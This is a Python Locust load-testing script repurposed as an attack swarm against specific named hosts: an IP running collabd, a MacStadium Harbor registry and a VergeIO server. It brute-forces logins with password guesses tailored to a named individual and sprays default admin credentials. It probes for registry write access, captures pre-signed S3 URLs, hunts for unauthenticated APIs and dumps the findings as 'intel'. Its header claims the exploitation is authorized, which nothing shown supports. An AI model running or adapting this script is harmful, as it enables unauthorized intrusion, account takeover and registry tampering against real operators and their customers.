#!/usr/bin/env python3
"""
locust-macstadium-207254.py — MacStadium Orka/collabd Attack Swarm
Target: 207.254.55.84 (collabd :8087) + Harbor Registry
VDT Authorization: Active exploitation authorized — zellkernel

Modes:
  collabd   — path enum + auth brute on Twisted collabd :8087
  harbor    — Harbor write capability + push test
  vergeio   — VergeIO auth path enumeration

Run:
  locust -f locust-macstadium-207254.py --headless -u 5 -r 1 \
    --host http://207.254.55.84:8087 --run-time 120s ColladbUser

  locust -f locust-macstadium-207254.py --headless -u 3 -r 1 \
    --host https://orkv10000082-01.oci.las1.macstadiumcloud.com --run-time 60s HarborUser
"""

from locust import HttpUser, task, between, events
import json
import random
import logging
import base64
import hashlib
import os

# ── Intel collector ──────────────────────────────────────────────────
INTEL = {
    "collabd_paths_found": [],
    "collabd_auth_success": [],
    "harbor_write_sessions": [],
    "vergeio_auth_paths": [],
    "interesting_responses": [],
}

# ── Credentials to test ──────────────────────────────────────────────
CREDS = [
    ("Greg", ""),
    ("Greg", "greg"),
    ("Greg", "password"),
    ("Greg", "streaming"),
    ("Greg", "bible"),
    ("Greg", "streamingbible"),
    ("Greg", "StreamingBible"),
    ("Greg", "streamingbibleradio"),
    ("Greg", "macmini"),
    ("Greg", "Greg2013"),
    ("Greg", "TheStreamingBible2"),
    ("Greg", "theStreamingBible"),
    ("user1", "user1"),
    ("user1", "password"),
    ("user1", ""),
    ("admin", "admin"),
    ("admin", "password"),
]

# collabd paths to enumerate
COLLABD_PATHS = [
    # Auth / login endpoints
    "/",
    "/auth/",
    "/auth/login",
    "/auth/login/",
    "/login",
    "/login/",
    "/signin",
    "/sessions",
    "/sessions/new",
    "/account/login",
    "/users/login",
    # collabd-specific (OS X Server Collaboration)
    "/collabd/",
    "/collabd/auth",
    "/collaboration/",
    "/collaboration/auth",
    # Groups / wiki (we know these exist)
    "/groups/",
    "/groups/user1/",
    "/groups/user1/wiki/",
    "/groups/user1/wiki/Home",
    "/groups/Greg/",
    # Blog / file share
    "/blog/",
    "/files/",
    "/webdav/",
    # API endpoints
    "/api/",
    "/api/v1/",
    "/api/users",
    "/api/sessions",
    # Twisted/collabd internal
    "/xmpp/",
    "/push/",
    "/notification/",
    "/presence/",
    # Apple Open Directory
    "/od/",
    "/directory/",
    # Version / status
    "/version",
    "/status",
    "/ping",
    "/health",
    "/_info",
    # WebDAV
    "/webdav/",
    "/dav/",
]

# Harbor OCI distribution paths to probe for write
HARBOR_WRITE_PATHS = [
    "/v2/library/tahoe/blobs/uploads/",
    "/v2/library/sonoma/blobs/uploads/",
    "/v2/library/sequoia/blobs/uploads/",
    "/v2/library/test-vdt/blobs/uploads/",
]


# ─────────────────────────────────────────────────────────────────────
class ColladbUser(HttpUser):
    """
    collabd :8087 — path enumeration + credential stuffing
    Run against: http://207.254.55.84:8087
    """
    wait_time = between(1, 3)
    _path_idx = 0
    _cred_idx = 0

    def on_start(self):
        logging.info(f"[ColladbUser] Starting against {self.host}")

    @task(3)
    def enumerate_path(self):
        path = COLLABD_PATHS[ColladbUser._path_idx % len(COLLABD_PATHS)]
        ColladbUser._path_idx += 1

        with self.client.get(path, catch_response=True, allow_redirects=True,
                             timeout=8) as r:
            if r.status_code not in (404, 500):
                msg = f"{path} → {r.status_code} ({len(r.content)}b)"
                if msg not in INTEL["collabd_paths_found"]:
                    INTEL["collabd_paths_found"].append(msg)
                    logging.info(f"[FOUND] {msg} | snippet: {r.text[:120].replace(chr(10),' ')}")
            r.success()

    @task(2)
    def try_form_auth(self):
        """POST form-encoded credentials to known paths."""
        cred = CREDS[ColladbUser._cred_idx % len(CREDS)]
        ColladbUser._cred_idx += 1
        user, passwd = cred

        for path in ["/sessions", "/auth/login", "/login", "/groups/user1/wiki/"]:
            with self.client.post(path, data={
                "login": user, "password": passwd,
                "username": user, "passwd": passwd,
                "_method": "POST",
            }, catch_response=True, timeout=8,
               headers={"Content-Type": "application/x-www-form-urlencoded"}) as r:
                if r.status_code in (200, 302) and "error" not in r.text.lower()[:200]:
                    win = f"[AUTH WIN] {user}:{passwd} at {path} → {r.status_code}"
                    INTEL["collabd_auth_success"].append(win)
                    logging.critical(win)
                    logging.critical(f"Response: {r.text[:500]}")
                r.success()

    @task(1)
    def try_json_auth(self):
        """POST JSON credentials."""
        cred = CREDS[ColladbUser._cred_idx % len(CREDS)]
        user, passwd = cred

        with self.client.post("/sessions", json={
            "login": user, "password": passwd
        }, catch_response=True, timeout=8) as r:
            if r.status_code not in (404, 405):
                logging.info(f"[JSON AUTH] {user}:{passwd} → {r.status_code}: {r.text[:100]}")
            r.success()

    @task(1)
    def try_basic_auth(self):
        """HTTP Basic Auth against wiki paths."""
        cred = CREDS[ColladbUser._cred_idx % len(CREDS)]
        user, passwd = cred

        with self.client.get("/groups/user1/wiki/", catch_response=True,
                             auth=(user, passwd), timeout=8) as r:
            if r.status_code == 200 and "error" not in r.text.lower()[:200]:
                logging.critical(f"[BASIC AUTH WIN] {user}:{passwd} → {r.status_code}")
                INTEL["collabd_auth_success"].append(f"basic:{user}:{passwd}")
            r.success()


# ─────────────────────────────────────────────────────────────────────
class HarborUser(HttpUser):
    """
    Harbor registry write probe + S3 key capture.
    Run against: https://orkv10000082-01.oci.las1.macstadiumcloud.com
    """
    wait_time = between(2, 5)

    HARBOR_AUTH = base64.b64encode(b"admin:Harbor12345").decode()

    def _auth_headers(self):
        return {
            "Authorization": f"Basic {self.HARBOR_AUTH}",
            "Accept": "application/json",
        }

    @task(3)
    def test_write_access(self):
        for path in HARBOR_WRITE_PATHS:
            with self.client.post(path, headers=self._auth_headers(),
                                  data=b"", catch_response=True,
                                  verify=False, timeout=10) as r:
                if r.status_code in (202, 201):
                    loc = r.headers.get("Location", "")
                    win = f"[WRITE ENABLED] {path} → {r.status_code} | session: {loc[:80]}"
                    INTEL["harbor_write_sessions"].append(win)
                    logging.critical(win)
                    # Cancel upload session immediately
                    if loc:
                        self.client.delete(loc, headers=self._auth_headers(),
                                           verify=False, timeout=5, catch_response=True)
                elif r.status_code not in (401, 403, 404):
                    logging.info(f"[HARBOR] {path} → {r.status_code}: {r.text[:100]}")
                r.success()

    @task(2)
    def capture_s3_url(self):
        """Get fresh pre-signed S3 URL from config blob redirect."""
        repos = [("tahoe", "latest"), ("sonoma", "latest"), ("sequoia", "latest")]
        proj, tag = random.choice(repos)

        manifest_url = f"/v2/library/{proj}/manifests/{tag}"
        with self.client.get(manifest_url, headers={
            **self._auth_headers(),
            "Accept": "application/vnd.oci.image.manifest.v1+json,"
                      "application/vnd.docker.distribution.manifest.v2+json"
        }, catch_response=True, verify=False, timeout=15) as r:
            if r.status_code == 200:
                mj = r.json()
                config_digest = mj.get("config", {}).get("digest", "")
                if config_digest:
                    with self.client.get(
                        f"/v2/library/{proj}/blobs/{config_digest}",
                        headers=self._auth_headers(),
                        allow_redirects=False, verify=False, timeout=10,
                        catch_response=True
                    ) as br:
                        if br.status_code in (302, 307):
                            loc = br.headers.get("Location", "")
                            logging.info(f"[S3 URL] {proj}:{tag} → {loc[:120]}")
                        br.success()
            r.success()

    @task(1)
    def enumerate_tags(self):
        """List all tags for each repo — find hidden/dev tags."""
        for repo in ["tahoe", "sonoma", "sequoia"]:
            with self.client.get(
                f"/v2/library/{repo}/tags/list",
                headers=self._auth_headers(),
                verify=False, catch_response=True, timeout=10
            ) as r:
                if r.status_code == 200:
                    tags = r.json().get("tags", [])
                    logging.info(f"[TAGS] {repo}: {tags}")
                r.success()


# ─────────────────────────────────────────────────────────────────────
class VergeIOUser(HttpUser):
    """
    VergeIO auth path enumeration.
    Run against: https://207.254.14.10
    """
    wait_time = between(2, 4)

    VERGEIO_PATHS = [
        "/api/v4/sessions",
        "/api/v4/auth",
        "/api/sessions",
        "/auth/login",
        "/login",
        "/api/v4/users/login",
        "/api/v4/login",
        "/api/v4/tokens",
    ]

    VERGEIO_CREDS = [
        {"login": "admin", "password": "admin"},
        {"login": "admin", "password": "verge"},
        {"login": "admin", "password": "vergeio"},
        {"login": "admin", "password": "macstadium"},
        {"username": "admin", "password": "admin"},
        {"user": "admin", "pass": "admin"},
        {"email": "admin@macstadium.com", "password": "admin"},
        {"email": "admin@macstadium.com", "password": "MacStadium1"},
    ]

    @task(2)
    def probe_auth_paths(self):
        path = random.choice(self.VERGEIO_PATHS)
        cred = random.choice(self.VERGEIO_CREDS)

        with self.client.post(path, json=cred, catch_response=True,
                              verify=False, timeout=8) as r:
            if r.status_code not in (404, 405):
                msg = f"{path} | {cred} → {r.status_code}: {r.text[:100]}"
                logging.info(f"[VERGEIO] {msg}")
                if r.status_code in (200, 201):
                    logging.critical(f"[WIN] {msg}")
            r.success()

    @task(1)
    def probe_unauth_api(self):
        """Find unauthenticated VergeIO API endpoints."""
        for path in ["/api/v4/vms", "/api/v4/nodes", "/api/v4/tenants",
                     "/api/v4/clusters", "/api/v4/version", "/api/v4/settings"]:
            with self.client.get(path, catch_response=True, verify=False, timeout=5) as r:
                if r.status_code == 200:
                    logging.critical(f"[UNAUTH] {path} → 200: {r.text[:200]}")
                r.success()


# ─────────────────────────────────────────────────────────────────────
@events.quitting.add_listener
def dump_intel(environment, **kwargs):
    print("\n" + "="*60)
    print("INTEL DUMP")
    for k, v in INTEL.items():
        if v:
            print(f"\n[{k}]")
            for item in v:
                print(f"  {item}")
    print("="*60)
